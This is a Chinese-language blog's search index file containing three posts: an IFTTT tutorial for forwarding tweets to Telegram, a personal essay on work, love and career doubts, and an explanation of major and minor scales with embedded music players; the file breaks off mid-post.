<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>用telegram订阅twitter</title>
    <link href="/posts/e857ecd7.html"/>
    <url>/posts/e857ecd7.html</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>如何用telegram订阅twitter上某位用户的推文呢？借助IFTTT其实可以轻松实现！</p><a id="more"></a><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>今年早些时候，我订阅了一个搬运王兴饭否的telegram频道，王兴有时候会分享一些东西，确实能拓宽眼界，现在还记得他之前分享的一句名言：“<strong>坐而论道不如起而行之</strong>”。</p><p>最近，之前订阅的telegram频道不更新了，找了一圈，在twitter上找到一个搬运工还在搬运王兴的饭否。但我几乎所有的消息都通过机器人推送到telegram上了，不太希望装太多APP。那么能否用telegram订阅twitter的某个用户呢？当然是可以的，不过需要用到一个第三方工具曲线救国——IFTTT。</p><p>说到telegram机器人，比如我使用阿里云的函数计算每天上午推送前一天的黄金价格；比如每次更新文章自动推送相关部署情况；大家感兴趣吗？感兴趣的话给自己埋一个坑。</p><center>  <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);zoom:80%;" src="https://pic.gaficat.com/default/telegram机器人推送消息示例.png"><br>  <div style="color:orange; display:inline-block; color:#999; padding:1px;">telegram机器人推送消息</div></br> </center><h1 id="ToDo"><a href="#ToDo" class="headerlink" title="ToDo"></a>ToDo</h1><p>IFTTT是一个自动化的平台，简单来说，你可以通过APP和网页，设置<strong>如果</strong><code>……</code><strong>然后就</strong><code>……</code>的自动化流程。比如某个RSS更新了，发送邮件通知自己；比如收到某一条webhook，然后做一些处理，总之，IFTTT有各式各样好玩的功能。</p><h2 id="一、总体逻辑"><a href="#一、总体逻辑" class="headerlink" title="一、总体逻辑"></a>一、总体逻辑</h2><p>本次我们利用IFTTT创建一个自动化流程：<strong>如果</strong><code>twitter上的某人发送了推文</code>，<strong>然后就</strong><code>把这条消息推送到telegram上</code>。</p><p>首先创建一个applet，在首页点击creat即可。</p><p><img src="https://pic.gaficat.com/default/IFTTT-%E5%88%9B%E5%BB%BAapplets.png" alt="创建IFTTT applets"></p><p>之后，就来到IFTTT创建一个自动化流程的核心步骤了，在这个界面可以看到创建自动化流程的总体逻辑：<strong>如果</strong><code>……</code><strong>然后就</strong><code>……</code>。还是比较简明的，我们点击<code>If This</code>后的<code>Add</code>，设置我们这个自动化流程的触发条件。</p><p><img src="https://pic.gaficat.com/default/IFTTT-%E6%95%B4%E4%BD%93%E9%80%BB%E8%BE%91.png" alt="IFTTT的整体逻辑"></p><h2 id="二、触发条件"><a href="#二、触发条件" class="headerlink" title="二、触发条件"></a>二、触发条件</h2><p>我们的整体逻辑是：<strong>如果</strong><code>twitter上的某人发送了推文</code>，<strong>然后就</strong><code>把这条消息推送到telegram上</code>。那么我们的触发条件<code>If This</code>中的内容就应该选择Twitter相关的东西，我们直接搜索twitter，就能找到twitter组件了。</p><p><img src="https://pic.gaficat.com/default/IFTTT-%E6%90%9C%E7%B4%A2twitter.png" alt="IFTTT搜索twitter组件"></p><p>进入Twitter组件后，可以看到有非常多的内容，这里我们选择<code>New tweet by a specific user</code>。</p><p><img src="https://pic.gaficat.com/default/IFTTT-twitter%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6.png" alt="IFTTT中twitter的功能"></p><p>紧接着，就需要输入我们希望订阅的twitter用户账号，这里我填入的是王兴饭否搬运工的账号（输入的用户账号下面可能会有一条红线，不太清楚原因，不过实际使用不影响）。</p><p><img src="https://pic.gaficat.com/default/IFTTT-twitter%E8%AE%A2%E9%98%85%E7%9B%AE%E6%A0%87%E7%94%A8%E6%88%B7.png" alt="IFTTT中设置twitter订阅目标用户"></p><h2 id="三、执行动作"><a href="#三、执行动作" class="headerlink" title="三、执行动作"></a>三、执行动作</h2><p>设置完触发条件后，会回到IFTTT创建自动化流程的总体页面，就可以添加我们自动化任务需要执行的任务了，点击<code>Then That</code>后的<code>Add</code>即可。</p><p>![IFTTT Then That](<a href="https://pic.gaficat.com/default/IFTTT-THEN">https://pic.gaficat.com/default/IFTTT-THEN</a> THAT.png)</p><p>因为我们希望执行的动作，是往telegram上推送内容，这里就可以直接搜索telegram，选定telegram，进行后续的配置。</p><p><img src="https://pic.gaficat.com/default/IFTTT-%E6%90%9C%E7%B4%A2telegram.png" alt="IFTTT搜索telegram组件"></p><p>IFTTT的telegram组件支持多种执行的任务：发送文字、图片、视频和音乐，因为是订阅的twitter以文字和图片为主，这里我选择了图片（选择文字其实也没问题）。</p><p><img src="https://pic.gaficat.com/default/IFTTT-telegram%E7%BB%84%E4%BB%B6.png" alt="IFTTT中telegram的功能"></p><p>紧接着的配置相对简单，分别是：</p><ul><li>推送到的目标：<code>Target chat</code></li><li>照片的URL：<code>Photo URL</code></li><li>说明：<code>caption</code></li></ul><blockquote><p>需要额外说明的是，可以点击<code>Add ingredient</code>添加一些IFTTT内置的内容。</p></blockquote><p><img src="https://pic.gaficat.com/default/IFTTT-telegram%E9%85%8D%E7%BD%AE.png" alt="IFTTT配置telegram组件"></p><h2 id="四、最终确认"><a href="#四、最终确认" class="headerlink" title="四、最终确认"></a>四、最终确认</h2><p>最后，我们需要确认创建的流程是否正确，如果发现有不太对的地方可以直接进行修改。我们这个流程里面可以看到，<strong>IF</strong>选择的触发条件是<code>New tweet by a specific user</code>，<strong>Then</strong>选择的是<code>Send photo</code>，没有问题，所以直接选择<code>Continue</code>。</p><p><img src="https://pic.gaficat.com/default/IFTTT-%E6%B5%81%E7%A8%8B%E7%A1%AE%E8%AE%A4.png" alt="IFTTT创建applets整体确认"></p><p>最后，可以对该自动化流程进行改名，这里我就默认不动了，直接点击<code>Finish</code>。</p><p><img src="https://pic.gaficat.com/default/IFTTT-%E6%80%BB%E4%BD%93%E7%A1%AE%E8%AE%A4.png" alt="IFTTT创建applets最终确认"></p><h1 id="实际效果和尾巴"><a href="#实际效果和尾巴" class="headerlink" title="实际效果和尾巴"></a>实际效果和尾巴</h1><p>等我们订阅的twitter用户更新了推文后，我们就可以在telegram上收到消息啦！</p><p><img src="https://pic.gaficat.com/default/twitter2telegram%E6%95%88%E6%9E%9C.png" alt="telegram订阅twitter用户的效果"></p><p>免费用户，IFTTT支持创建四个自动化流程，如果订阅的数量少还好，超过四个就要掏钱了。</p>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>工作快满三年的那些惑</title>
    <link href="/posts/40abbf69.html"/>
    <url>/posts/40abbf69.html</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>工作快满三年了，你是否也正经历同事离职、工作逐渐丧失兴趣、职业规划迷茫、个人问题被家人催促的情况？那这篇文章一个问题都没办法帮你解决，哈哈哈，好久没写文章了，水一篇。对，顺带分享两个自己喜欢的音乐，Josh Leake的《A Quiet Departure》和石进的《此去经年》。</p><a id="more"></a><h1 id="过了新鲜劲儿，很多事都索然无味"><a href="#过了新鲜劲儿，很多事都索然无味" class="headerlink" title="过了新鲜劲儿，很多事都索然无味"></a>过了新鲜劲儿，很多事都索然无味</h1><p>我发现，人吧，一旦过了新鲜劲儿，动力就不足了，很多事情都变得索然无味了，无论是感情、工作或是兴趣爱好：</p><ul><li>每100天给她手写信件，时间久了，送信的人觉得平静的生活很难有最早时的兴致去创作内容。收信的人，第一次收到信件的时候，满眼惊喜，次数多了，也就逐渐觉得是理所当然了。</li><li>刚毕业的年轻人，初入职场，单身一人，觉得事业好什么都好，自己的公司很厉害，觉得自己的领导很重视自己，觉得自己能干出行业内有影响力的成果，升职加薪，迎娶白富美，指日可待。时间久了，也就逐渐疲惫了，自己在哪里都只是螺丝钉，这个世界少了谁都会继续下去的。</li><li>兴趣爱好，关于个人博客，讨论最多的就是，哪个博客工具好用？hexo？hugo？wordpress？因为讨论哪个博客工具好用时，是在刚开始写博客的劲头儿上，时间久了，折腾了一通工具，换了各种好看的主题，回头来没有坚持稳定的输出原创内容，访问者寥寥无几，也就坚持不下去了。</li></ul><p>我最近整理了一下自己写过的文章，发现最开始的时候一个月能写十几篇文章，不管是生活中的小事还是工作中遇到的技术问题都会记录下来。而现在呢，一个月也就三四篇文章。之前看到过一个小伙伴说：<strong>“单纯靠兴趣，很难支撑得起坚持写文章的”</strong>。确实，无论坚持下来写博客的，还是坚持写微信公众号的，亦或是做短视频的，大部分人的动力，都是靠流量去赚钱。</p><p>从小到大，你有坚持过一项有一定难度的事情吗？画画、某种乐器、规律的健身、读书、日记或是其他东西？大概率没有吧，有也是断断续续的坚持。坚持的过程本身就是和自己惰性抗争的过程，就是在锻炼自己的执行力。小孩子都知道动画片好看、游戏好玩，但我们不是小孩子了，我们已经不是这次考试贪玩了，下次考试努力把高分考回来就行了。有些多事情，错过一次，就是一年，奔三的人，愈发感到时间经不起浪费。</p><p>总之吧，最近没有太多写文章的素材。TVOC传感器，在知乎上的大兄弟提醒后也提上了日程，等待队友做板子中。即兴伴奏呢？学了很多理论，自己都学的云里雾里的。新鲜好玩的东西呢？买了蒲公英，结果公司升级了网络，禁用了P2P，免费的蒲公英不能切换模式，P2P拉闸。只好写写自己最近的一些生活了，我希望至少写文章这件事不要断，能保持一定的输出频率。</p><h1 id="600天的环城公园和樊登书店"><a href="#600天的环城公园和樊登书店" class="headerlink" title="600天的环城公园和樊登书店"></a>600天的环城公园和樊登书店</h1><p>我和冯冯是在知乎上认识的，就是这么一个“人人都是年入百万”的平台，我觉得自己的圈子太小了，应该扩大自己的圈子，广发相亲贴，结果就是随手在知乎某个相亲贴下的回答，让我认识了冯冯，冯冯被我言语中的幽默和自律迷住了眼睛，等在一起才发现，原来这个人不像他相亲贴说的那样自律、有趣，反而不爱说话，执行力不强，是个大懒鬼，哈哈哈哈哈，后悔也来不及了。</p><p>上个周末，我们一起去了环城公园，冯冯说她喜欢看秋天的银杏，黄色的树叶在树枝上摇摇欲坠，远远看去，树干、地面都是金黄的。途径樊登书店，冯冯说进去看看，书店很安静，店主是个小姑娘，招呼我们随便看后，便自己忙着打包需要寄走的图书。其实，书店的图书没有吸引我，一进店就吸引到我的是播放的BGM，3/4拍的，听着像是某种华尔兹或者圆舞曲，有一丝梦幻、也有一丝忧伤，很能让人安静下来，挺有品味的。挺想结婚的时候我弹这首曲子，然后冯冯顺着旋律，一蹦一蹦像小仙女一样出来。</p>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <script src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script>            <meting-js  auto="https://y.qq.com/n/yqq/song/000mrJFr2eOOgz.html" mode="circulation" autoplay="false" mutex="true" listmaxheight="340px" preload="auto" theme="#ad7a86" loop="none"></meting-js><p>我们看到一个小桌子上有一些本子，上面是一些人诉说自己的故事，或是希望考上好大学，或是希望家人早日从病痛中康复，也有其他人在那些故事下面用另一种颜色的笔墨写下自己的留言。冯冯说：“我们选两张明信片吧！”</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);zoom:30%;"     src="https://pic.gaficat.com/default/600天的明信片.jpg">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">600天的明信片</div></br> </center><p>和冯冯互相给对方写了一段话，等冯冯递给我她写好的明信片，我才发现原来还有印章呢！我选了五个章：</p><ul><li><strong>见字如晤</strong>：我始终觉得书信，亲手将自己的情感用笔墨固定在纸张上，是一件很真诚的事，因为书信需要投入的时间远比电子的文字多得多，希望冯冯看到这张明信片，能想起600天一起路过的樊登书店。</li><li><strong>感谢</strong>：我不是一个很细腻的人，我一直觉得自己很直男，所以在今年前半年，我和冯冯出现了非常大的分歧，给了冯冯许多的伤害。是冯冯的包容，才让我们走了下去，所以，很感谢冯冯。</li><li><strong>此去经年</strong>：我人生第一次挣了工资，第一次买票坐第一排听音乐会，是石进的音乐会。当时还不知道演出结束有返场的环节，返场的第一首曲子，大提琴前三个音一出来，我鸡皮疙瘩就起来了，马上找笔，把<strong>《此去经年》</strong>四个字记了下来。挺巧呢，写明信片，能盖到这个章。</li><li><strong>来日方长</strong>：希望和冯冯能走下去，我们双方，作为对方人生里第一段如此正式的恋爱，如果能一辈子走下去，是一件多么值得欢喜的事情。600天是一个新的开始，和冯冯有了合适的沟通方式，希望能一直走下去，一起过700天、800天、3000天吧。</li><li><strong>欢喜</strong>：有欢，才有喜。以此提醒我和冯冯，不要吵架，不要冷战。那些欢快的日子，让我们更加喜爱对方。</li></ul>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <script src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script>            <meting-js  auto="https://www.xiami.com/song/1813974701" mode="circulation" autoplay="false" mutex="true" listmaxheight="340px" preload="auto" theme="#ad7a86" loop="none"></meting-js><p>我回想起上次和冯冯去环城公园，还是去年陪冯冯打疫苗，我们手牵手，公园很安静，天气很好，冯冯说她特别喜欢住在公园旁边，没事就能悠闲地散散步。今年因为疫情，我和冯冯很长时间都没有见面的机会，沟通出了很多问题。我当然是那个该吃吃，该睡睡的人，但冯冯在感情和工作都不顺利的情况下，度日如年。如果任何一方选择放手，哪还会有这次的故地重游。</p><p>不知道冯冯知不知道，有一个傻子，为了把她追回来，顶着夏日正午的烈阳，狂奔于半勺舒舒和地铁站之间，很害怕自己迟到了，人财两空。（高德百度不讲武德，来骗，来偷袭，我不认识路的老同志，这样好吗？这样不好！最后靠腾讯地图找到了半勺舒舒的店面。庆幸，冯冯还是经受不住红茶蛋糕的诱惑，这个小吃货！）</p><h1 id="奔三的人浪费不起时间，错不起了"><a href="#奔三的人浪费不起时间，错不起了" class="headerlink" title="奔三的人浪费不起时间，错不起了"></a>奔三的人浪费不起时间，错不起了</h1><p>我最近吧，总觉得工作上的事情提不起兴趣，昨天有个同事问我，你当初是为啥来咱们公司的，我说，当时综合了手头上的offer，薪水、工作强度、工作地点等因素吧，这个工作当时是最适合我的。我觉得人生会有很多种可能，你的任何一个决定，都让你之后的轨迹发生改变，也许当初我去了国防科大，拿到了推免的资格，现在正在国防科大读硕士。也许当初我去了海康威视，在机器人的产品线上加班，也看不到希望。也许我当初本硕连读过了，现在刚工作一年，正在兴头上，很开心。很多事都不好说，但是，逐渐我意识到了一个很严重的问题，<strong>随着年龄的增加，你选择的空间不多了。</strong></p><p>我本科毕业的时候就24岁了，我依稀记得刚上大学那会儿，身边的同学很多都小我三岁，你知道这意味着什么吗？这意味着那些比我小三岁的“同龄人”，他们本科毕业，工作三年，发现工作和自己兴趣不对口，再回去考研，和我本科毕业直接考研年龄上是一样的。这意味着那些本科毕业直接考研的同学，都是24岁，他们是硕士，我是本科。我真的经不起错，考研？失败了怎么办？我就白白浪费了一年的时间。所以当初拿到了一个不错的offer就紧紧攥在手里，拿住了。</p><blockquote><p>其实造成我年龄这么大的原因，一方面是我上小学本身比同龄的孩子晚一年，我也不知道真实情况，但听父母说，当初幼儿园老师说，小孩子7岁半再去上一年级没问题，六岁上学不好。另一方面，我复读了一年，浪费了一年的时间。而小时候浪费的时间，终究要让你在未来补回来。但，你能怨谁呢？怨不了谁啊！只能自己想办法，给自己职业规划时，少犯错误吧！</p></blockquote><p>其实你问我你选择现在手里的这份工作后悔吗？我说我肯定不后悔，让我在选择一次，我依然会这么选。因为这段工作经历，让我明白了一些事：</p><ul><li><strong>能认识一些清华北大的人，甚至于有幸跟他们共事一段时间，是一种无悔经历。</strong>因为即使你在北京海淀区上高中，你能进清华北大的概率只有1%，你就能想象接触到清华北大的人，对于一个五线城市出来的孩子有多么不容易了。</li><li><strong>一个被批评不适合做科研的loser，能被清华北大的博士认可是很庆幸的一件事。</strong>我申请本硕连读的时候，面试的老师指着鼻子说我不适合做科研，我做的所有事都是流水线上工人做的，当时真的很憋屈。而在我工作的两年多时间内，我平均每五个季度拿一次绩效Q+。我旁边一位工作了五年的同事，前几天说，他都不知道有绩效这回事儿，因为这个季度Q-，五年来才第一次知道有这回事。所以，真的很感谢我的领导，我是一个很普通的人，我是努力，但也没有那么努力，能这么认可我，真的真的很感激。</li><li><strong>这份工作让我及时明白了，也许我真的没有那么热爱IT行业。</strong>我有过很多择业的选择，比如选择学习艺术（曾经我认为学习艺术就是重复死练不用智商的工作，大猩猩训练训练都能行），选择考公（曾经我认为，我爱钱，我要挣大钱，公务员不行。因为父母都是公务员，小时候我想要玩具，我想要吃必胜客，我都不敢要，印象里，即使父母都是公务员，家里的经济状况也不允许我要很多东西）。这份工作，给了我还算不错的薪水，我能买自己想买的东西，但程序猿，需要为35岁焦虑；研究猿，需要为成果焦虑。内卷的时代，很难有轻松的工作吧。</li></ul><p>我曾经真的认为，自己天赋异禀，我真的有那么喜欢编程，我能靠科技去创业，或者能靠写代码，成为某个团队的leader，但目前来看，和自己预想的完全不一样呀！马上27岁了，很庆幸，人生的第一份工作，能有时间恋爱，有时间练琴，有时间思考自己未来的规划。<strong>总之吧，对我而言，很庆幸人生的第一份工作真的很棒，能有时间停下来好好思考，及时明白了一些事，这是不幸中的万幸吧。</strong>如果当初本硕连读了，我可能要到30岁才能明白自己不那么热爱IT行业，才会开始去做一些打算，那时真的就太晚了。</p><p>当然了，看到这篇文章的大学生们，你们肯定大部分不会有我遇到的年龄问题，本科毕业出去打拼几年，不喜欢在读研。或者直接考研，出去打拼几年，等了解了整个行业的情况，再回头思考职业规划也不迟。对我而言，年龄确实限制了我在非常多方面的选择。</p><h1 id="离职了两个同事，有些惶恐"><a href="#离职了两个同事，有些惶恐" class="headerlink" title="离职了两个同事，有些惶恐"></a>离职了两个同事，有些惶恐</h1><p>很多人都第一份工作都是签的3年的合同，所以3年是一个坎。最近连续有两位同事离职了，一位是极力要求招我的北大博士，另一位是一起共事的东北小伙儿。大家都有自己的规划，北大博士希望自己带更大的团队，在科研上取得更大的成就，而目前在这个团队中，他的精力很难集中在自己专业的研究方向上。东北小伙儿呢，女票要去北京考研，加上公司给的薪水确实比不上北京那边的其他公司，所以索性要去北京挣大钱。</p><blockquote><p>北大博士，我一直叫他星哥。18年秋招，刚刚本硕连读被批的一无是处的我，四处遭受打击。时间已经8月中旬了，我早早就去了学校，留意学校所有宣讲会与我有关的机会，留意其他学校宣讲会与我有关的机会，留意没有去重庆的企业，他们校招可能与我有关的机会。然后，八月底到九月中旬，我没有睡过一个安稳觉，我以为我拿着一沓比赛获奖证书，优秀的工程能力能成为offer收割机，然而两周的时间，面试几乎都没收到太多。最终，我收到了星哥的面试邀请。</p><p>我记得和星哥就简单聊了聊大学做的事、看过一些什么书，聊了聊我的笔试开放题，很愉快的就结束了。面试后，虽然还没有到最终VP面试给到offer的环节，星哥也还是说了一些自己的看法，觉得我应该去北京闯闯，我的履历有很多机会。</p><p>你一直以为，面试官就是尖酸刻薄，问几个难倒你的问题就结束了，事实上并不是。</p><p>我后来问星哥，为什么当时会给我offer，让我进入下一轮，我没有任何网络安全的经验。星哥说：“其实我看了你的笔试题我就确定要你了，你的开放题很有想法，至少你对物联网是非常了解的，没有了解的话，写不出那样的答案。其实我们阅卷，一眼就看出来大部分是百度查出来的，你的答案太突出了。”</p></blockquote><p>当然，最终还是和星哥成为了同事。星哥作为我们的实验室负责人，我们工作没有做到位，出了问题，星哥帮我们顶着；做研究出成果时，星哥带着我们，推我们往前走。所以我觉得星哥是一个很好的领导，一个很好的同事。</p><p>总之吧，突然就有一种人心惶惶的感觉了。总以为身边这些同事，会陪你走过五年十年，有可能你是第一个离开的，结果一下子别人先离开了，还一下子走两个。一个是给了你信心，从谷底把你往上拉的领导；一个是一起共事做项目的小伙伴，有些说不上的滋味。另一方面，就觉得，这些人说走就走了，大领导也留不住，身为同事也很难做一些什么，这个世界，不是离了谁就转不了的。别人走了，你呢？你的五年规划，十年规划是什么？有了规划，执行的如何？</p><p>我觉得虽然自己有很多的打算，比如说弹琴，比如说折腾一些电子设计的东西，但是都不能变现，它们目前都只能算自己业余的爱好。一旦目前这份工作丢掉了，自己瞬间就失去经济能力了，东北小伙儿技术能力很强，北大博士有学历，我自己呢？还是很惶恐吧。</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>不知道是各种泻药文章看多了还是怎么，总之吧，似乎除了公务员、国企、事业单位，其他人就都是打工人，工作就是为了挣钱，都不配活着了，就都得35岁等着送外卖开滴滴，被人看不起。</p><p>身边的同事倒是都挺乐观的，谁知道未来10年、20年会怎么样呢？干好手头的工作，未雨绸缪一些事儿吧，做自己人生的老板，老板，哪有安逸舒适的。</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大调和小调，你还可以这样理解</title>
    <link href="/posts/bac5f5bf.html"/>
    <url>/posts/bac5f5bf.html</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>本文整理自官大为的视频，介绍了调式、大调和小调的概念（一张频率的分布图很清楚的说明了调式的关键是<strong>排列方式</strong>），并举例对比了大调和小调在音响效果上的区别。</p><a id="more"></a><h1 id="口水话"><a href="#口水话" class="headerlink" title="口水话"></a>口水话</h1><p>我记得2019年和2020年的目标，都是希望自己能在即兴伴奏上有一些突破，起码是入门。机缘巧合，无意间看到了邓垚老师即兴伴奏的课，不同于其他的课程，邓垚老师的课，灌输了很多关于即兴伴奏的基础概念，让我对于即兴伴奏有了框架、整体上的认识，这是很多课程上没有的。没有一些常识性的基础概念、框架结构，直接讲细节的和弦，很容易陷入不知道在学什么的一种状态。所以，邓垚老师的课极大程度上激发了我对于即兴伴奏探索的欲望。</p><p>我其实在网上看各种关于钢琴即兴伴奏的课程有一段时间了，无论邓垚老师的课、姜创钢琴的课、冰咖啡的流行音乐和声学还是宋大叔的键盘和声学等等，但是目前整个人处于听不出来和声进行、不会给乐曲配和声以及看着容易上手稀碎的迷茫状态。在学习到小调的时候，三种小调复杂的和弦让我突然间就产生了一个<strong>非常强烈疑问</strong>，所有的即兴伴奏课程，都在讲三和弦、七和弦，讲大调的正三和弦，讲小调的各种和弦。<strong>几乎所有人都在强调和弦在大小调上的重要性，那调到底是什么？大调到底是什么？小调到底是什么？区分开他们有什么作用？为什么不同的调式听起来感情色彩不一样？</strong></p><p>所以就有了今天的文章，我在网上查了一些各种调式的文章，发现大部分关于调式的解释，都在说大小调，都照着乐理书说全全半全全全半的排列，但是这到底有什么含义，并没有说清楚。前段时间刷好和弦的视频，发现了一个关于调式的系列，从一个独特的角度阐述了调式的概念。我把视频内容中的一些重点整理出来，供自己日后翻看吧~</p><h1 id="什么是调式？"><a href="#什么是调式？" class="headerlink" title="什么是调式？"></a>什么是调式？</h1><p>当我们翻阅《The New Grove Dictionary of Music and Musicians》时，关于调式的文章长达80000多字，而哈利·波特与魔法石也只有70000多字。<strong>调式在不同的时期、不同的文化都有不同的意义，用一句话来说：调式就是一个音阶中，音与音之间的排列模式。我们常见的调式，就是大调和小调。</strong></p><h1 id="什么是大调？"><a href="#什么是大调？" class="headerlink" title="什么是大调？"></a>什么是大调？</h1><p>大调就是我们最熟悉的Do Re Mi Fa Sol La Si Do的排列模式，不是说这些音，而是排列模式。</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);zoom:30%;"     src="https://pic.gaficat.com/default/C大调音阶.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">C大调音阶</div></br> </center><p>那么，为什么Do Re Mi Fa Sol La Si Do听起来像Do Re Mi Fa Sol La Si Do呢？或者说，为什么只要其中有一个音不对，我们就听起来感觉怪怪的呢？比如下面这样：</p>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <div id="mmedia-rKJXwUPX" style="margin-bottom: 20px; width: "></div>        <script>          var ap_rKJXwUPX = new APlayer({            element: document.getElementById("mmedia-rKJXwUPX"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "弹错音的大调",              author: "官大为",              url: "https://music.gaficat.com/%E5%BC%B9%E9%94%99%E9%9F%B3%E7%9A%84%E5%A4%A7%E8%B0%83.mp3",              pic: "",              lrc: ""            },            undefined          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap_rKJXwUPX);        </script><p>我们在小学二年级就学过，声音的高低是由于物体振动频率不同，这就可以解释上面的现象了：将Do Re Mi Fa Sol La Si Do的频率（音高）放在一条竖线上，就会长下面这个样子。</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);zoom:25%;"     src="https://pic.gaficat.com/default/C大调官大为示意图.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">C大调排列方式</div></br> </center><p>我们发现，上面这些音，他们频率之间的距离其实是不一样的，比如Do和Re之间的距离要宽一些，Mi和Fa之间的距离要窄一些。乐理上，就把Mi和Fa这种频率距离比较近的音，称为半音；把Do和Re这种频率距离比较远的音称为全音。Do Re Mi Fa Sol La Si Do这几个音之间有七个间隔，排列方式就是：全音 全音 半音 全音 全音 全音 半音。现在，我们就可以从任何一个音起，构造一个听起来像是Do Re Mi Fa Sol La Si Do的音阶。</p>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <div id="mmedia-SGisWmuU" style="margin-bottom: 20px; width: "></div>        <script>          var ap_SGisWmuU = new APlayer({            element: document.getElementById("mmedia-SGisWmuU"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "任意音构成大调音阶",              author: "官大为",              url: "https://music.gaficat.com/%E4%BB%BB%E6%84%8F%E9%9F%B3%E6%9E%84%E6%88%90%E7%9A%84%E5%A4%A7%E8%B0%83%E9%9F%B3%E9%98%B6.mp3",              pic: "",              lrc: ""            },            undefined          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap_SGisWmuU);        </script><p>结论就是：只要我们找到八个音，这八个音之间的间隔，<strong>按照全全半全全全半方式排列，构成的音阶，我们就把这个音阶成为大调。</strong></p><h1 id="什么是小调"><a href="#什么是小调" class="headerlink" title="什么是小调"></a>什么是小调</h1><p>一旦我们有了一个大调音阶，要产生一个小调音阶就相对简单了。比如上述的例子，我们只需要在C大调的基础上，把第三、第六、第七个音降低半音，我们就得到了一个新的排列模式，我们把这个新的排列模式称为小调。</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);zoom:25%;"     src="https://pic.gaficat.com/default/C大调和小调的音阶.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">C小调音阶</div></br> </center><p>当然了，你会说，那小调的排列方式到底是什么呀？小调相对复杂，有自然小调、和声小调和旋律小调，本片文章篇幅有限，就将在下一篇继续说明。</p><h1 id="大调-VS-小调"><a href="#大调-VS-小调" class="headerlink" title="大调 VS 小调"></a>大调 VS 小调</h1><p>C大调音阶听起来就是下面这样：</p>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <div id="mmedia-bdaGoIEU" style="margin-bottom: 20px; width: "></div>        <script>          var ap_bdaGoIEU = new APlayer({            element: document.getElementById("mmedia-bdaGoIEU"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "C大调音阶",              author: "官大为",              url: "https://music.gaficat.com/C%E5%A4%A7%E8%B0%83%E9%9F%B3%E9%98%B6.mp3",              pic: "",              lrc: ""            },            undefined          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap_bdaGoIEU);        </script><p>C小调音阶听起来就是下面这样：</p>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <div id="mmedia-aQdcJyOr" style="margin-bottom: 20px; width: "></div>        <script>          var ap_aQdcJyOr = new APlayer({            element: document.getElementById("mmedia-aQdcJyOr"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "C小调音阶",              author: "官大为",              url: "https://music.gaficat.com/C%E5%B0%8F%E8%B0%83%E9%9F%B3%E9%98%B6.mp3",              pic: "",              lrc: ""            },            undefined          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap_aQdcJyOr);        </script><p>我们听到的歌曲，其实都是基于各种调式创作出来的，基于大调创作的歌曲听起来开心、明朗，基于小调创作的歌曲听起来忧伤、唯美。我们用同一首儿歌示例，谱子一样，小调只是把第三、第六、第七降低半音。基于大调的儿歌听起来是这样的：</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 